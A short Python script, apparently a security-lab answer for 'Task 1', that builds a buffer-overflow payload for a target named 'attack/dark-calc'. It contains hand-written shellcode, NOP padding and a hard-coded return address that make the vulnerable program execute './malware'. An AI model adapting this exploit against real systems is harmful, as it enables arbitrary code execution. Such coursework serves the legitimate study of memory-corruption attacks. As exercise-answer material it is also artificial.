#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.
"""
import sys
import struct

code = bytes.fromhex("48bf f00f 8000 1072 0000 48b8 e017 40000000 0000 ffd0")
payload = (code + b"\x90" * (24 - len(code)) + struct.pack("<Q", 0x721000800fd0)
          + b"./malware\x00" + b"\n")

sys.stdout.buffer.write(payload)
